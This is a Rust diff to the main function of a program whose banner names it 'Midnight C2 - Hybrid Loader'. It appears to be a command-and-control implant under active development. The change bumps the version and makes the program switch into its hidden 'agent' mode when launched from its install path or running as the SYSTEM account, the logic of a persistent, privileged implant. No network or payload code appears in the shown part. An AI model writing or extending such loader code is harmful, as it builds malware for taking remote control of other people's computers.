@@ -400,20 +400,21 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
 fn main() -> windows::core::Result<()> {
     unsafe {
         let args: Vec<String> = std::env::args().collect();
-        let is_agent_mode = args.len() > 1 && args[1] == "agent";
+        let (current_path, target_path, _) = get_install_info();
+        
+        // --- IMPROVED AGENT MODE DETECTION (v0.6.10 Memory Restore) ---
+        let is_target_path = current_path.to_lowercase() == target_path.to_lowercase();
+        let is_system = std::env::var("USERNAME").unwrap_or_default().to_uppercase() == "SYSTEM";
+        let is_agent_mode = (args.len() > 1 && args[1] == "agent") || is_target_path || is_system;
         
         if !is_agent_mode {
             // ===== INSTALLER MODE (with UI) =====
-            
-            // Create installer UI window (Always create window first)
             let hwnd = create_installer_window();
-            
             let (_, _, is_admin) = get_install_info();
             
-            // Run logic in background thread
             std::thread::spawn(move || {
                 append_log("╔════════════════════════════════════════╗");
-                append_log("║   Midnight C2 - Hybrid Loader v0.6.8  ║");
+                append_log("║   Midnight C2 - Hybrid Loader v0.6.10 ║");
                 append_log("║       Build Date: 2026-02-15          ║");
                 append_log("╚════════════════════════════════════════╝");
                 append_log("");
